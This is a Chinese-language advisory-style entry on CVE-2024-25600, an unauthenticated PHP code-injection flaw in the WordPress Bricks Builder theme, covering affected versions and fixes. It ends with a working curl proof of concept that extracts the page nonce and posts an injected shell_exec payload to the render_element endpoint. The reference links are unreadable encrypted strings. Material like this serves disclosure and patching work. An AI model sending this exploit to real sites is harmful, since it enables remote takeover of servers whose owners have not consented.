# WordPress Bricks Builder 漏洞

## 产品简介
Bricks 是一个流行的 WordPress 可视化主题构建器，允许用户通过拖放界面创建自定义网站。

## 漏洞列表

### CVE-2024-25600 - 未授权远程代码执行 (RCE)
- **危害等级**: 严重 (CVSS 9.8)
- **漏洞描述**: Bricks Builder 的 `/wp-json/bricks/v1/render_element` API 端点存在代码注入漏洞。攻击者可以通过构造恶意的 `queryEditor` 参数执行任意 PHP 代码，无需身份验证。
- **影响版本**: <= 1.9.6
- **修复版本**: 1.9.6.1
- **利用条件**: 
  - 目标网站使用 Bricks Builder 主题
  - 需要获取有效的 nonce 值（可从前端页面获取）
- **修复建议**: 
  1. 立即升级到 1.9.6.1 或更高版本
  2. 如无法升级，禁用 Bricks 主题
  3. 使用 WAF 拦截对 `/wp-json/bricks/v1/render_element` 的恶意请求

## 攻击向量

```bash
# 1. 获取 nonce (从页面 HTML 中提取)
curl -s https://target.com/ | grep -oP 'nonce":"[a-f0-9]+"'

# 2. 发送恶意请求
curl -k -X POST https://target.com/wp-json/bricks/v1/render_element \
-H "Content-Type: application/json" \
-d '{
  "postId": "1",
  "nonce": "[NONCE]",
  "element": {
    "name": "container",
    "settings": {
      "hasLoop": "true",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "echo shell_exec(\"id\");",
        "objectType": "post"
      }
    }
  }
}'
```

## 参考链接
- ENCv1:htl6Oyo4CazlHqJV3JD1pA==:8VmRHB/D+7b/YmZVfFjrdw==:f27qL0cMyMNvaXYaP5kREO/vfc1ZE+u0ZbqwW9gq1t5Ra+mLiUJn6xEgtr/X+qfl
- ENCv1:pCJNSckmCkfg2eGDxNw7BA==:/bBMBs4HdqI6dDBZ7tsxnA==:qyt29FmwiQjjeAVDHCWqsK1LdcWiXHEEZ0Uyx+HLDcJnpMlaWuf98C/CD1PNBHs++EfCO5T/R8vBSpbyXHcmN00cU8pVnjXbiiVuaqQ3MtP/FVbIXlxwb5RdDWiPU2GY
- ENCv1:yhG0eGqNzAIWtc5LO4oVbg==:JjdQjyJAgfZM0nQqX9jrZA==:WmK6NnWaSisdkLljUc4okrY5ae+IjZ8wnO8w39Lz99l5+B55+pSPdg0ywLewsODN
- ENCv1:Mp62qVePsqP4bONCPIreYw==:cWYSQb3F8knFHcFl51Y74w==:gdsmQlHByr0TwIm1U2iHEmhARXx/HPLjlmGHDjboUhHHTo7TZOFuy5MWJQ349Ny9U8MpIZPGV2oooKwaddcT0w==

